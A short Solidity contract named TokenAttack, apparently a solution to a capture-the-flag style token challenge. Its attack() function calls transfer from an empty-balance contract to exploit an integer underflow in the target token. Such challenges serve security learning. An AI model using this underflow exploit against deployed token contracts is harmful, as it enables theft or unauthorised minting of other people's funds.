// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface IToken {

    function totalSupply() external returns (uint256);

    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256 balance);

}


contract TokenAttack{
    IToken i_token;

    constructor(address token) public {
        i_token  = IToken(token);
    }

    function attack() public {
        i_token.transfer(msg.sender, 1); 
    }
    
}


